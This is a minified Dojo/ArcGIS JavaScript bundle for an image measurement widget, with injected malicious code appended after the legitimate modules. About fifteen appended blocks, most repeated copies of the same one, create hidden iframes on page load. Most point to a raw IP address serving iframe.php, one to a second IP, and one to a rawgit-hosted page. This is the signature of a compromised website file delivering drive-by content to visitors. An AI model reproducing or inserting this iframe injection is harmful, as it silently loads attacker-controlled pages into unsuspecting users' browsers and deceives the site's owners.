function(e,d,k,g,p,h,t){e=e(t,{declaredClass:"esri.tasks.ImageServiceMeasureTask",constructor:function(e){this._url.path+="/measure";this._handler=d.hitch(this,this._handler)},__msigns:[{n:"execute",c:3,a:[{i:0,p:["fromGeometry","toGeometry"]}],e:2}],_handler:function(d,e,g,p,h){try{this._successHandler([d],"onComplete",g,h)}catch(u){this._errorHandler(u,p,h)}},execute:function(e,g,h,t){var n=t.assembly;e=this._encode(d.mixin({},this._url.query,{f:"json"},e.toJson(n&&n[0])));var k=this._handler,w=
this._errorHandler;return p({url:this._url.path,content:e,callbackParamName:"callback",load:function(d,e){k(d,e,g,h,t.dfd)},error:function(d){w(d,h,t.dfd)}})},onComplete:function(){}});h._createWrappers(e);k("extend-esri")&&d.setObject("tasks.ImageServiceMeasureTask",e,g);return e})},"dijit/PopupMenuItem":function(){define("dojo/_base/declare dojo/dom-style dojo/_base/lang dojo/query ./popup ./registry ./MenuItem ./hccss".split(" "),function(e,d,k,g,p,h,t){return e("dijit.PopupMenuItem",t,{baseClass:"dijitMenuItem dijitPopupMenuItem",
_fillContent:function(){if(this.srcNodeRef){var d=g("*",this.srcNodeRef);this.inherited(arguments,[d[0]]);this.dropDownContainer=this.srcNodeRef}},_openPopup:function(d,e){var g=this.popup;p.open(k.delegate(d,{popup:this.popup,around:this.domNode}));e&&g.focus&&g.focus()},_closePopup:function(){p.close(this.popup);this.popup.parentMenu=null},startup:function(){if(!this._started){this.inherited(arguments);if(!this.popup){var e=g("[widgetId]",this.dropDownContainer)[0];this.popup=h.byNode(e)}this.ownerDocumentBody.appendChild(this.popup.domNode);
this.popup.domNode.setAttribute("aria-labelledby",this.containerNode.id);this.popup.startup();this.popup.domNode.style.display="none";this.arrowWrapper&&d.set(this.arrowWrapper,"visibility","");this.focusNode.setAttribute("aria-haspopup","true")}},destroyDescendants:function(d){this.popup&&(this.popup._destroyed||this.popup.destroyRecursive(d),delete this.popup);this.inherited(arguments)}})})},"dijit/RadioMenuItem":function(){define("dojo/_base/array dojo/_base/declare dojo/dom-class dojo/query!css2 ./CheckedMenuItem ./registry".split(" "),
function(e,d,k,g,p,h){return d("dijit.RadioButtonMenuItem",p,{baseClass:"dijitMenuItem dijitRadioMenuItem",role:"menuitemradio",checkedChar:"*",group:"",_setGroupAttr:"domNode",_setCheckedAttr:function(d){this.inherited(arguments);this._created&&d&&this.group&&e.forEach(this._getRelatedWidgets(),function(d){d!=this&&d.checked&&d.set("checked",!1)},this)},_onClick:function(d){this.disabled||this.checked||(this.set("checked",!0),this.onChange(!0));this.onClick(d)},_getRelatedWidgets:function(){var d=
[];g("[group\x3d"+this.group+"][role\x3d"+this.role+"]").forEach(function(e){(e=h.getEnclosingWidget(e))&&d.push(e)});return d}})})},"widgets/ImageMeasurement/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:esri/dijit/templates/ImageServiceMeasure.html":'\x3cdiv data-dojo-attach-point\x3d"esriImageServiceMeasure" class\x3d"esriImageServiceMeasure"\x3e\r\n  \x3cdiv class\x3d"esriImageServiceMeasureToggleButton" data-dojo-attach-point\x3d"toggleButtonDiv"\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriImageServiceMeasureDropdownContainer" data-dojo-attach-point\x3d"measureDropDownContainer"\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"measureButtonContainer"\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/ImageMeasurement/Widget.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"measureWidgetDiv"\x3e\x3c/div\x3e\r\n\x3c/div\x3e\r\n\r\n\r\n',"url:widgets/ImageMeasurement/css/style.css":".esriImageServiceMeasureToolbarLayout {border: none; box-shadow: none; border-radius: none;}","*now":function(e){e(['dojo/i18n!*preload*widgets/ImageMeasurement/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},
"*noref":1}});
define(["dojo/_base/declare","jimu/BaseWidget","esri/dijit/ImageServiceMeasure"],function(e,d,k){return e([d],{baseClass:"jimu-widget-ImageMeasurement",name:"ImageMeasurement",imageServiceMeasureWidget:null,startup:function(){this.inherited(arguments);var d=this.config.ImageMeasurement,e=this._getLayerId(this.config.ImageMeasurement.layerTitle);this.imageServiceMeasureWidget=new k({map:this.map,layer:this.map.getLayer(e),displayMeasureResultInPopup:d.displayMeasureResultInPopup,layout:"toolbar",linearUnit:d.linearUnit,
angularUnit:d.angularUnit,areaUnit:d.areaUnit,displayOperations:d.displayOperations},this.measureWidgetDiv);this.imageServiceMeasureWidget.startup()},onClose:function(){this.imageServiceMeasureWidget.deactivate()},_getLayerId:function(d){var e=this.map.itemInfo.itemData.operationalLayers,h,g;for(h in e)e.hasOwnProperty(h)&&e[h].title===d&&(g=e[h].id);return g}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});